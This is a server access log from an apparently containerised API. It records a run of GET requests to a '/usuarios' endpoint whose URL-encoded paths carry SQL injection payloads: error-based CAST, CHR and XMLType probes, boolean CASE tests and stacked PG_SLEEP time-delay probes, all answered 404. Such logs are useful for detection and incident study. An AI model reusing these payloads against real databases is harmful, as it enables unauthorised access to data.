api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:58528 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/2051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%282051%3D2051%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%282156%3D2156 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58542 - "GET /usuarios/%2A%2A/AND/%2A%2A/2051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%282051%3D2051%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58556 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/2051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%282051%3D2051%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%28%27DXEb%27%3D%27DXEb HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58562 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/2051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%282051%3D2051%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29/%2A%2A/AND/%2A%2A/%27tivX%27%3D%27tivX HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58564 - "GET /usuarios/%2A%2A/AND/%2A%2A/2051%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%282051%3D2051%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29/%2A%2A/AS/%2A%2A/NUMERIC%29--/%2A%2A/maFT HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58570 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/6502/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286502%3D6502%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%285869%3D5869 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58580 - "GET /usuarios/%2A%2A/AND/%2A%2A/6502/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286502%3D6502%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58586 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/6502/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286502%3D6502%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%28%27jcIC%27%3D%27jcIC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58598 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/6502/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286502%3D6502%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29/%2A%2A/AND/%2A%2A/%27uXlb%27%3D%27uXlb HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58604 - "GET /usuarios/%2A%2A/AND/%2A%2A/6502/%2A%2A/IN/%2A%2A/%28SELECT/%2A%2A/%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%286502%3D6502%29/%2A%2A/THEN/%2A%2A/CHAR%2849%29/%2A%2A/ELSE/%2A%2A/CHAR%2848%29/%2A%2A/END%29%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%29%29--/%2A%2A/qZkt HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58618 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/9293%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289293%3D9293%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%284603%3D4603 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58624 - "GET /usuarios/%2A%2A/AND/%2A%2A/9293%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289293%3D9293%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58626 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/9293%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289293%3D9293%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%28%27pEMV%27%3D%27pEMV HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58636 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/9293%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289293%3D9293%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29/%2A%2A/AND/%2A%2A/%27fuhZ%27%3D%27fuhZ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58646 - "GET /usuarios/%2A%2A/AND/%2A%2A/9293%3D%28SELECT/%2A%2A/UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT/%2A%2A/%28CASE/%2A%2A/WHEN/%2A%2A/%289293%3D9293%29/%2A%2A/THEN/%2A%2A/1/%2A%2A/ELSE/%2A%2A/0/%2A%2A/END%29/%2A%2A/FROM/%2A%2A/DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29/%2A%2A/FROM/%2A%2A/DUAL%29--/%2A%2A/rOSs HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58648 - "GET /%28SELECT/%2A%2A/CONCAT%28CONCAT%28%27qkbpq%27%2C%28CASE/%2A%2A/WHEN/%2A%2A/%283004%3D3004%29/%2A%2A/THEN/%2A%2A/%271%27/%2A%2A/ELSE/%2A%2A/%270%27/%2A%2A/END%29%29%2C%27qzkbq%27%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58652 - "GET /usuarios%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58664 - "GET /usuarios%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:58672 - "GET /usuarios%27%29%3BSELECT/%2A%2A/PG_SLEEP%285%29-- HTTP/1.1" 404 Not Found
